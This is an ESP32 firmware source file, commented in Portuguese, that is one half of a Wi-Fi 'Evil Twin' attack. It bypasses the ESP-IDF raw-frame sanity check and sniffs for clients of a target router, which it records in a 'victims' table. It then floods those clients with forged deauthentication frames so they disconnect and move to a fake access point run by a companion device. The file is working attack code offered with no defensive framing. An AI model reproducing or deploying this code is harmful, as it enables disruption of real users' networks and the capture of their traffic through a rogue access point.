#include "funcoes_evtw.h"

// ---------------------------------------------------------------------------
// ESP #1 - DEAUTH DEDICADO
//
// Esta ESP NAO sobe AP falso. Ela so:
//   1. Trava o radio no canal do roteador real.
//   2. Usa o sniffer (modo promiscuo) para descobrir quais clientes estao
//      falando com o roteador real (BSSID alvo).
//   3. Faz flood de deauth unicast nesses clientes, continuamente.
//
// A Evil Twin (ESP #2) usa MAC proprio + mesmo SSID, entao este deauth mira
// SOMENTE o BSSID real e nao derruba quem ja migrou para a rede falsa.
// ---------------------------------------------------------------------------

// Bypass do sanity check da pilha Wi-Fi do ESP-IDF, necessario para injetar
// quadros brutos (deauth) que de outra forma seriam bloqueados.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#define MAX_VITIMAS          10     // tamanho da tabela de clientes detectados
#define INTERVALO_DEAUTH_MS  100    // periodo do flood
#define FRAMES_POR_RAJADA    3      // quadros enviados por vitima a cada ciclo
#define IDADE_MAX_VITIMA_MS  60000  // esquece vitima nao vista ha 60s
#define STATUS_INTERVALO_MS  5000   // periodo do heartbeat no serial

static uint8_t       vitimas[MAX_VITIMAS][6];
static unsigned long vitima_visto[MAX_VITIMAS];
static int           num_vitimas = 0;

static uint8_t          meu_mac_sta[6];        // cacheado uma vez no setup
static volatile uint8_t mac_pendente[6];       // candidato achado pelo sniffer
static volatile bool    tem_pendente = false;
static unsigned long    ultimo_flood  = 0;
static unsigned long    ultimo_status = 0;

// Contadores de diagnostico (mostrados no heartbeat)
static unsigned long total_frames_ok  = 0;   // injecoes aceitas pelo driver
static unsigned long total_frames_err = 0;   // injecoes rejeitadas

// bssid_alvo so e valido se o scan achou o alvo (nao for tudo zero).
static bool alvoValido() {
    for (int i = 0; i < 6; i++)
        if (bssid_alvo[i] != 0) return true;
    return false;
}

// Callback do sniffer: roda em contexto de interrupcao, entao faz o minimo -
// apenas marca um candidato. O processamento pesado fica no loopDeauth().
//
// Assume frames de uplink (cliente -> AP, bit ToDS=1), onde:
//   payload[4..9]  = Addr1 = RA = BSSID do roteador (destino do quadro)
//   payload[10..15]= Addr2 = SA = MAC do cliente    (origem do quadro)
void IRAM_ATTR sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t* payload     = pkt->payload;
    uint8_t* mac_destino = &payload[4];
    uint8_t* mac_origem  = &payload[10];

    // So interessa trafego indo PARA o roteador real
    if (memcmp(mac_destino, bssid_alvo, 6) != 0) return;
    // Ignora broadcast/multicast
    if (mac_origem[0] & 0x01) return;
    // Ignora a propria ESP e o proprio roteador
    if (memcmp(mac_origem, meu_mac_sta, 6) == 0) return;
    if (memcmp(mac_origem, bssid_alvo, 6) == 0) return;
    // PROTECAO: nunca mirar o AP falso nem o STA do repetidor (uplink/internet
    // da outra ESP). Esses MACs chegam pela UART (ver enlace.cpp).
    if (protegidos_validos) {
        if (memcmp(mac_origem, (const void*)mac_sta_protegido, 6) == 0) return;
        if (memcmp(mac_origem, (const void*)mac_ap_protegido,  6) == 0) return;
    }

    memcpy((void*)mac_pendente, mac_origem, 6);
    tem_pendente = true;
}

// Adiciona/atualiza um cliente na tabela de vitimas.
static void registrarVitima(const uint8_t* mac) {
    for (int i = 0; i < num_vitimas; i++) {
        if (memcmp(vitimas[i], mac, 6) == 0) {
            vitima_visto[i] = millis();
            return;
        }
    }
    if (num_vitimas < MAX_VITIMAS) {
        memcpy(vitimas[num_vitimas], mac, 6);
        vitima_visto[num_vitimas] = millis();
        num_vitimas++;
        Serial.printf(">> [Nova vitima] %02X:%02X:%02X:%02X:%02X:%02X (total %d)\n",
                      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], num_vitimas);
        return;
    }
    // Tabela cheia: sobrescreve a vitima vista ha mais tempo
    int mais_antiga = 0;
    for (int i = 1; i < num_vitimas; i++)
        if (vitima_visto[i] < vitima_visto[mais_antiga]) mais_antiga = i;
    memcpy(vitimas[mais_antiga], mac, 6);
    vitima_visto[mais_antiga] = millis();
}

// Monta e injeta um frame de deauth: roteador real (BSSID) -> cliente alvo.
static void enviarDeauth(const uint8_t* alvo) {
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,                                           // tipo: deauth
        alvo[0], alvo[1], alvo[2], alvo[3], alvo[4], alvo[5],             // addr1: destino (cliente)
        bssid_alvo[0], bssid_alvo[1], bssid_alvo[2],
        bssid_alvo[3], bssid_alvo[4], bssid_alvo[5],                      // addr2: origem (AP real)
        bssid_alvo[0], bssid_alvo[1], bssid_alvo[2],
        bssid_alvo[3], bssid_alvo[4], bssid_alvo[5],                      // addr3: BSSID (AP real)
        0x00, 0x00,                                                       // sequence control
        0x07, 0x00                                                        // reason code 7
    };
    for (int i = 0; i < FRAMES_POR_RAJADA; i++) {
        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        if (r == ESP_OK) total_frames_ok++;
        else             total_frames_err++;
    }
}

void configurarDeauth() {
    Serial.println("Configurando radio para DEAUTH...");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();          // nao fica associado a nada (senao trava o canal)
    delay(100);

    esp_wifi_get_mac(WIFI_IF_STA, meu_mac_sta);   // cacheia o MAC uma unica vez

    esp_wifi_set_promiscuous(true);
    // So entrega pacotes de DADOS ao callback (alivia a carga da ISR)
    wifi_promiscuous_filter_t filtro = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filtro);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
    esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);  // TRAVA no canal alvo
    esp_wifi_set_max_tx_power(84);

    Serial.printf(">> Deauth ativo no canal %d, mirando BSSID ", canal_alvo);
    for (int j = 0; j < 6; j++) {
        Serial.printf("%02X", bssid_alvo[j]);
        if (j < 5) Serial.print(":");
    }
    Serial.println();

    if (!alvoValido()) {
        Serial.println(">> !!! ALVO INVALIDO (BSSID zerado): o scan nao achou o SSID.");
        Serial.println(">> !!! Verifique SSID_ALVO em src/alvo.cpp e ligue o roteador.");
    }
}

void loopDeauth() {
    // 0. Recebe do AP+NAT (canal, BSSID alvo, MACs a proteger, go/pausa)
    enlaceAtualizarDeauth();

    // 1. Absorve o candidato detectado pelo sniffer (fora da interrupcao)
    if (tem_pendente) {
        uint8_t mac[6];
        memcpy(mac, (const void*)mac_pendente, 6);
        tem_pendente = false;
        registrarVitima(mac);
    }

    unsigned long agora = millis();

    // 2. Flood periodico - SO quando autorizado pelo AP+NAT (deauth_autorizado).
    //    Enquanto pausado, segue sniffando pra manter a lista de vitimas quente.
    if (deauth_autorizado && agora - ultimo_flood >= INTERVALO_DEAUTH_MS) {
        ultimo_flood = agora;
        for (int i = 0; i < num_vitimas; i++) {
            if (agora - vitima_visto[i] > IDADE_MAX_VITIMA_MS) continue;
            enviarDeauth(vitimas[i]);
        }
    }

    // 3. Heartbeat: prova que o firmware esta vivo e mostra o diagnostico
    if (agora - ultimo_status >= STATUS_INTERVALO_MS) {
        ultimo_status = agora;
        Serial.printf(">> [status] canal=%d vitimas=%d frames_ok=%lu frames_err=%lu %s%s\n",
                      canal_alvo, num_vitimas, total_frames_ok, total_frames_err,
                      deauth_autorizado ? "[FLOOD]" : "[PAUSADO]",
                      alvoValido() ? "" : "  <ALVO INVALIDO>");
        // Telemetria de volta pro AP+NAT
        Serial2.printf("DEAUTH vitimas=%d ok=%lu err=%lu ch=%d\n",
                       num_vitimas, total_frames_ok, total_frames_err, canal_alvo);
    }
}
